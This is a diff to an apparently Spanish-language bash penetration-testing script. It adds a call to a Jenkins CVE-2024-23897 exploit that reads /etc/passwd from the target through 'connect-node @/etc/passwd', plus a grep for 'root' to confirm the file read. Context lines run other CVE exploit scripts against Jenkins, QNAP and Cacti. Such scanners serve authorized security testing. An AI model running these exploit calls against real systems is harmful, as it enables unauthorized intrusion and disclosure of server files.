@@ -1280,6 +1280,9 @@ function enumeracionCMS () {
 
 			echo -e "\t\t[+] nuclei Jenkins ("$proto_http"://"$host":"$port")"
 			nuclei -u "$proto_http"://"$host":"$port""$path_web" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36' -rate-limit 1 -id /root/.local/nuclei-templates/cves/Jenkins.txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"JenkinsNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"JenkinsNuclei.txt &			
+
+			jenkins-cve-2024-23897.sh -s "${proto_http}://${host}:${port}${path_web}" connect-node "@/etc/passwd" >  logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"jenkins~cve~2024~23897.txt &
+			
 			
 			jenkins-cve-2024-43044.py "${proto_http}://${host}:${port}${path_web}" >  logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"jenkins~cve~2024~43044.txt &
 			#https://github.com/convisolabs/CVE-2024-43044-jenkins
@@ -2534,7 +2537,9 @@ if [[ $webScaneado -eq 1 ]]; then
 			[ ! -e ".vulnerabilidades2/${host}_${port}_invokerJboss.txt" ] && egrep -i 'linux|windows|unix' logs/vulnerabilidades/"$host"_"$port"_invokerJboss.txt > .vulnerabilidades/"$host"_"$port"_invokerJboss.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/${host}_${port}_jbossVuln.txt" ] && egrep --color=never "VULNERABLE|EXPOSED|INCONCLUSIVE" logs/vulnerabilidades/"$host"_"$port"_jbossVuln.txt > .vulnerabilidades/"$host"_"$port"_jbossVuln.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/"$host"_"$port"_"$path_web_sin_slash"cacti~cve~2024~29895.txt" ] && grep -i 'uid' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"cacti~cve~2024~29895.txt >> .vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"cacti~cve~2024~29895.txt 2>/dev/null
-			[ ! -e ".vulnerabilidades2/"$host"_"$port"_"$path_web_sin_slash"jenkins~cve~2024~43044.txt" ] && grep -i vulnerable logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"jenkins~cve~2024~43044.txt >> .vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"jenkins~cve~2024~43044.txt 2>/dev/null
+			[ ! -e ".vulnerabilidades2/"$host"_"$port"_"$path_web_sin_slash"jenkins~cve~2024~43044.txt" ] && grep -i vulnerable logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"jenkins~cve~2024~43044.txt >> .vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"jenkins~cve~2024~43044.txt 2>/dev/null		
+			[ ! -e ".vulnerabilidades2/"$host"_"$port"_"$path_web_sin_slash"jenkins~cve~2024~23897.txt" ] && grep -i root logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"jenkins~cve~2024~23897.txt >> .vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"jenkins~cve~2024~23897.txt 2>/dev/null
+			
 			
 			[ ! -e ".vulnerabilidades2/${host}_${port}_qnap~cve~2024~27130.txt" ] && grep -i vulnerable logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"qnap~cve~2024~27130.txt >> .vulnerabilidades/"$host"_"$port"_qnap~cve~2024~27130.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/${host}_${port}_qnap~CVE~2023~47218.txt" ] && egrep -i 'uid|admin' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"qnap~CVE~2023~47218.txt >> .vulnerabilidades/"$host"_"$port"_qnap~CVE~2023~47218.txt 2>/dev/null
